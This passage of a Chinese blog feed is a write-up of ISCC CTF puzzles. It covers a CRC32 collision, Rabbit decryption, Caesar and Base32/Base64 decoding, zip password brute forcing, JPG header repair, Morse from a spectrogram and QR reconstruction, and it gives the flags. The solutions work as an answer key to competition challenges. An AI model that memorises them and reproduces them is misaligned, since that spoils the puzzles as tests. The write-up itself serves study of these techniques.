title="混乱的音频"></a>混乱的音频</h3><blockquote><p>题目描述：<br>小明正在整理包含bed、bird、cat、dog、down、eight的音频文件数据，可小明不小心把分类好的一部分数据集弄混了。文件名非常混乱，无法判别出那些文件属于哪个单词类别。碰巧小红来问小明考试复习资料的密码。小明说：“我记得这个密码都是大写的英文字母，并且密码和我的爱好息息相关，具体的我也记不清了。你要是能帮我把这些音频文件分好类，你应该就会发现密码。”小红了解到小明是个计算机专业的学生，平时经常搜集一些与信息技术有关的新闻资讯。他经常参加ctf比赛，对密码学十分熟悉，对数字非常敏感。为了小红能得到考试复习资料，你能帮助小红将混乱的音频文件分好类并获取密码吗？<br>提示：比例 数据下载链接：<a href="https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw">https://pan.baidu.com/s/1r8C1FByHpgNZJsaUkjASOw</a> 提取码：p1yh</p></blockquote><h3 id="小明的宠物兔"><a href="#小明的宠物兔" class="headerlink" title="小明的宠物兔"></a>小明的宠物兔</h3><blockquote><p>题目描述：<br>小明的宠物兔总是发出一些神秘的声音，小明很想知道兔兔在干什么，你能帮他翻译一下吗？</p></blockquote><p>一张图片rabbit.txt，提示碰撞，应该是CRC32碰撞，foremost分离出压缩包</p><p>flag.txt内容，加salt，应该是rabbit加密</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">U2FsdGVkX18kNy7RlBvcV9WJsqa+oxvdd0Ir86U2cU2996N6ltZi7VVOaw==<br></code></pre></td></tr></table></figure><p>CRC32碰撞，得到加密压缩包key.zip内容，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python">┌──(kali㉿kali)-[~/桌面/Python/CRC32]<br>└─$ python3 crc32.py reverse <span class="hljs-number">0x3dacac6b</span> <br><span class="hljs-number">4</span> <span class="hljs-built_in">bytes</span>: &#123;<span class="hljs-number">0x47</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xce</span>&#125;<br>verification checksum: <span class="hljs-number">0x3dacac6b</span> (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: (<span class="hljs-number">0_0</span>) (OK)<br><span class="hljs-number">5</span> <span class="hljs-built_in">bytes</span>: DCr4m (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 1QhloU (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 3mmr6H (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 49Gqqk (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 5Uumn6 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 7ips7+ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 8Gpbyp (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: 9G1Sbi (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: EHZxWz (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: F93jxv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: I6mk_a (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: J+wTt) (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: K+6eo0 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: KGEHkt (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: N/jUuJ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O/+dnS (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: O3d8oG (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: TX.K94 (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Uy1jKa (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: XJju5k (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: YJ+D.r (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: Zvoklv (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: a3H1hL (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: dG(pwf (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: e7U0i/ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: fgb2/o (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: g6AbXj (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kHvqPq (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: kT9-Qe (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: lQqOzZ (OK)<br><span class="hljs-number">6</span> <span class="hljs-built_in">bytes</span>: vwW0Z8 (OK)                     <br></code></pre></td></tr></table></figure><p>5字节，最终密钥为<code>(0_0)</code>，Rabbit解密得到flag<br><img src="https://img-blog.csdnimg.cn/20210518182708616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="擂台"><a href="#擂台" class="headerlink" title="擂台"></a>擂台</h2><h3 id="小明的表情包"><a href="#小明的表情包" class="headerlink" title="小明的表情包"></a>小明的表情包</h3><blockquote><p>放假期间小红被亲戚叫去帮店里帮忙，店里忙极了导致小红没有时间写代码。小红苦恼极了，她突然想起来小明有一张非常适合描述她此时心情的表情包。于是，小红让小明把表情包分享给她。小明说如果你记得我的出生的日月年，我就交给你。小明的生日年份隐藏在这串凯撒密码“AVARGRRA<br>AVARGL AVAR”中，你能帮小红得到小明的表情包吗？</p></blockquote><p>编写脚本进行凯撒密码爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;AVARGRRA AVARGL AVAR&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br><br></code></pre></td></tr></table></figure><p>看到有含义的英文：NINETEEN NINETY NINE<br><img src="https://img-blog.csdnimg.cn/20210502214305685.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>猜测是901909，然而并不是压缩包口令，根据题目提示密码是生日年份，直接爆破8位数字密码<br><img src="https://img-blog.csdnimg.cn/20210502214743451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到口令07071999，解压压缩包，得到的jpg文件无法打开，拖入010 editor中，与正常的jpg文件比较，发现缺少JPG文件头<br><img src="https://img-blog.csdnimg.cn/20210502215507914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>将前八位改为FF D8 FF E0 00 10 4A 46，保存得到flag<br><img src="https://img-blog.csdnimg.cn/20210502215613249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Base小偷"><a href="#Base小偷" class="headerlink" title="Base小偷"></a>Base小偷</h3><blockquote><p>被凯撒小猫偷走的等号1/3<br>Flag格式：flag{XXX}</p></blockquote><p>密文</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br></code></pre></td></tr></table></figure><p>使用上面的凯撒密码爆破脚本，修改一下脚本，写入crack.txt文件中：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">s = <span class="hljs-string">&quot;trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli&quot;</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;crack.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kaisa</span>(<span class="hljs-params">k</span>):</span><br>    t = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;a&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;A&#x27;</span> &lt;= c &lt;= <span class="hljs-string">&#x27;Z&#x27;</span>:<br>            t += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) + ((<span class="hljs-built_in">ord</span>(c) - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) + <span class="hljs-built_in">int</span>(k)) % <span class="hljs-number">26</span>)<br>        <span class="hljs-keyword">else</span>:<br>            t += c<br>    print(t)<br>    f.write(t+<span class="hljs-string">&quot;\n&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">26</span>):<br>    kaisa(i)<br></code></pre></td></tr></table></figure><p>得到crack.txt</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python">trefy2k2ov2lig2gqd2eqakoxjqcw4lztnfli<br>usfgz2l2pw2mjh2hre2frblpykrdx4mauogmj<br>vtgha2m2qx2nki2isf2gscmqzlsey4nbvphnk<br>wuhib2n2ry2olj2jtg2htdnramtfz4ocwqiol<br>xvijc2o2sz2pmk2kuh2iueosbnuga4pdxrjpm<br>ywjkd2p2ta2qnl2lvi2jvfptcovhb4qeyskqn<br>zxkle2q2ub2rom2mwj2kwgqudpwic4rfztlro<br>aylmf2r2vc2spn2nxk2lxhrveqxjd4sgaumsp<br>bzmng2s2wd2tqo2oyl2myiswfryke4thbvntq<br>canoh2t2xe2urp2pzm2nzjtxgszlf4uicwour<br>dbopi2u2yf2vsq2qan2oakuyhtamg4vjdxpvs<br>ecpqj2v2zg2wtr2rbo2pblvziubnh4wkeyqwt<br>fdqrk2w2ah2xus2scp2qcmwajvcoi4xlfzrxu<br>gersl2x2bi2yvt2tdq2rdnxbkwdpj4ymgasyv<br>hfstm2y2cj2zwu2uer2seoyclxeqk4znhbtzw<br>igtun2z2dk2axv2vfs2tfpzdmyfrl4aoicuax<br>jhuvo2a2el2byw2wgt2ugqaenzgsm4bpjdvby<br>kivwp2b2fm2czx2xhu2vhrbfoahtn4cqkewcz<br>ljwxq2c2gn2day2yiv2wiscgpbiuo4drlfxda<br>mkxyr2d2ho2ebz2zjw2xjtdhqcjvp4esmgyeb<br>nlyzs2e2ip2fca2akx2ykueirdkwq4ftnhzfc<br>omzat2f2jq2gdb2bly2zlvfjselxr4guoiagd<br>pnabu2g2kr2hec2cmz2amwgktfmys4hvpjbhe<br>qobcv2h2ls2ifd2dna2bnxhlugnzt4iwqkcif<br>rpcdw2i2mt2jge2eob2coyimvhoau4jxrldjg<br>sqdex2j2nu2khf2fpc2dpzjnwipbv4kysmekh<br></code></pre></td></tr></table></figure><p>猜测是Base32编码，得到密文每行37字符 ，而Base32按5比特切分的二进制数据必须是40比特的倍数，需要在每行末尾追三个===，并且小写转换为大写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding: UTF-8</span><br><span class="hljs-keyword">import</span> base64<br><br>ff = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;crack.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    lines = f.readlines()<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:<br>        line_n =line.replace(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>        line_n=line_n+<span class="hljs-string">r&#x27;===&#x27;</span>+<span class="hljs-string">&#x27;\n&#x27;</span>     <span class="hljs-comment">#行末尾加上&quot;===&quot;,同时加上&quot;\n&quot;换行符</span><br>        line_new=line_n.upper()        <span class="hljs-comment">#小写转换为大写</span><br>        ff.write(line_new)           <span class="hljs-comment">#写入一个新文件中</span><br>ff.close()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><br>    <span class="hljs-built_in">list</span> = f.read().splitlines()   <span class="hljs-comment">#存入列表中</span><br>    i = <span class="hljs-number">0</span><br>    ls2 = [<span class="hljs-built_in">str</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]  <span class="hljs-comment">#转换为字符串类型</span><br>    <span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(<span class="hljs-built_in">list</span>):<br>        print(base64.b32decode(ls2[i]))<br>        i += <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>运行脚本，发现一段base64编码<br><img src="https://img-blog.csdnimg.cn/20210502213613369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>base64解码得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">flag&#123;tqq.tqq@jjb&#125;<br></code></pre></td></tr></table></figure><h3 id="真作假时假亦真"><a href="#真作假时假亦真" class="headerlink" title="真作假时假亦真"></a>真作假时假亦真</h3><blockquote><p>浅韵姐姐第一次参加ISCC，但没有很多CTF工具，为此她很苦恼。<br>你能切身体会一下吗？<br>附件下载链接：<a href="https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw">https://pan.baidu.com/s/1jroyNjtnCwPXxt6A8_0pAw</a><br>提取码：a0oh</p></blockquote><p>下载附件，得到download.wav，拖入Audacity查看频谱图</p><p><img src="https://img-blog.csdnimg.cn/20210508204254102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>弄下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">.. ... -.-. -.-. ---... .... . -.-. .... --- -. . -.-- --..-- .-.-.. -.-- --- ..- .-.. --- --- -.- .. -. --. ..-. --- .-. - .... . ..-. ..- -.-. -.- .. -. --. ..-. .-.. .- --. -. --- .-- ..--..<br></code></pre></td></tr></table></figure><p>摩斯密码解密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ISCCHECHONEYYOULOOKINGFORTHEFUCKINGFLAGNOW?<br></code></pre></td></tr></table></figure><p>不是flag，foremost分离文件得到一张png图片，exiftool查看图片信息，得到QQ号<br><img src="https://img-blog.csdnimg.cn/20210508204759240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看QQ空间，在留言板发现假flag<img src="https://img-blog.csdnimg.cn/20210508204953265.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>加好友问题<code>ISCC&#123;e@$Y_s0cia1_engineering&#125;</code>也是假flag</p><p>空间里唯一的一张图片<br><img src="https://img-blog.csdnimg.cn/202105082051187.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我当时做的时候掉坑里去了，直接下载图片，010 editor什么也看不到，思路就断了。<br><img src="https://img-blog.csdnimg.cn/20210508193738188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用原图地址链接下载图片，能看到一个蓝奏云链接<br><img src="https://img-blog.csdnimg.cn/20210508193452110.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提取出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://wwa.lanzous.com/iNVbsoqrz8f<br>MTVDQw==<br></code></pre></td></tr></table></figure><p>提取码是<code>MTVDQw==</code>，Base64解码得到<code>15CC</code>,下载附件<br><img src="https://img-blog.csdnimg.cn/20210508211008367.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用<a href="http://z.duoluosb.com/">在线网站</a>进行社会主义核心价值观解密得到</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">壹贰叁肆伍陆柒8玖〇壹2叁肆56柒89〇壹23肆伍<br>陆78901贰3肆56柒89〇1贰叁4伍陆7捌玖0<br>壹2叁肆伍6柒89〇壹贰叁肆5陆柒捌9〇123肆5<br>陆7捌玖〇1贰345陆柒8玖〇壹贰34567890<br>壹2叁肆伍6柒8玖01贰叁4伍6柒捌玖〇壹234伍<br>陆78901贰3肆5陆78玖0壹贰345陆7捌玖0<br>壹贰叁肆伍陆柒890壹贰叁肆56柒8玖0壹234伍<br>67890123肆伍6柒捌玖〇1贰345陆7890<br>壹贰3肆56柒捌90123肆56柒捌玖〇壹贰3肆5<br>67捌9〇1234伍陆78玖〇壹贰3肆5陆7捌9〇<br>12叁肆伍6柒8901贰叁肆伍陆7捌9〇壹2叁肆伍<br>陆柒89〇123肆伍67890壹234567捌玖0<br>壹2叁4伍陆柒捌901贰3肆56柒捌9〇壹2345<br>陆78玖0壹23肆伍67捌90壹2叁4伍陆7捌9〇<br>壹2叁45陆柒89〇1贰叁45陆7890壹23肆伍<br>陆柒8901234伍陆柒8玖〇1贰34伍6柒捌玖0<br>壹贰34伍陆柒89〇壹2叁肆5陆柒89〇1贰叁肆伍<br>678901234伍67捌9〇1234567890<br>壹贰叁肆伍陆柒8玖0壹2叁4伍6柒8玖〇壹贰叁肆伍<br>陆78901贰3肆伍陆7捌901贰3肆56789〇<br>壹2叁肆伍6柒89012345陆柒8玖0壹贰叁4伍<br>陆7捌玖〇1贰3肆56789〇1贰3肆5陆柒捌9〇<br>壹2叁肆伍6柒8玖〇1贰345陆柒8玖0壹贰叁4伍<br>陆78901贰3肆5678玖01贰3肆56789〇<br>壹贰叁肆伍陆柒8玖01贰3肆伍陆78玖〇壹贰叁肆伍<br></code></pre></td></tr></table></figure><p>汉字转换成1，数字换成0 。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">1111111011101100100110011<br>1000001010010010110110110<br>1011101001111101110100010<br>1011101000110111100000000<br>1011101010011010111110001<br>1000001010100101100010110<br>1111111000111100101010001<br>0000000011011110100010000<br>1101001100000100111111010<br>0010100001100111101010101<br>0011101000011111010110111<br>1100100011000001000000110<br>1010111100010100110110000<br>1001010011001001010110101<br>1010011001011001000010011<br>1100000001110110100101110<br>1100111001101101100101111<br>0000000001001010000000000<br>1111111010101010101111111<br>1000001011101000101000001<br>1011101000000001101011101<br>1011101010000010101011101<br>1011101011010001101011101<br>1000001010000100101000001<br>1111111010010111001111111<br></code></pre></td></tr></table></figure><p>25x25,之前做过一样的，直接使用脚本转换成二维码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> PIL.Image<br>MAX = <span class="hljs-number">25</span><br>pic = PIL.Image.new(<span class="hljs-string">&quot;RGB&quot;</span>,(MAX,MAX))<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;1111111011101100100110011100000101001001011011011010111010011111011101000101011101000110111100000000101110101001101011111000110000010101001011000101101111111000111100101010001000000001101111010001000011010011000001001111110100010100001100111101010101001110100001111101011011111001000110000010000001101010111100010100110110000100101001100100101011010110100110010110010000100111100000001110110100101110110011100110110110010111100000000010010100000000001111111010101010101111111100000101110100010100000110111010000000011010111011011101010000010101011101101110101101000110101110110000010100001001010000011111111010010111001111111&#x27;</span><br>i=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span>,MAX):<br>                <span class="hljs-keyword">if</span>(<span class="hljs-built_in">str</span>[i] == <span class="hljs-string">&#x27;1&#x27;</span>):<br>                        pic.putpixel([x,y],(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>))<br>                <span class="hljs-keyword">else</span>:<br>                        pic.putpixel([x,y],(<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>                i = i+<span class="hljs-number">1</span><br>pic.show()<br>pic.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><p>扫描二维码得到flag</p>]]></content>
    
    
      
      
    <summary type="html"> &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;



&lt;h2 id=&quot;练武&quot;&gt;&lt;a href=&quot;#练武&quot; class=&quot;headerlink&quot; title=&quot;练武&quot;&gt;&lt;/a&gt;练武&lt;/h2&gt;&lt;h3 id=&quot;李华的红包&quot;&gt;&lt;a href=&quot;#李华的红包&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="CTF" scheme="http://atkx.top/categories/CTF/"/>
    
    <category term="比赛复现" scheme="http://atkx.top/categories/CTF/%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Write up" scheme="http://atkx.top/tags/Write-up/"/>
    
  </entry>
  
  <entry>
    <title>浅析条件竞争漏洞</title>
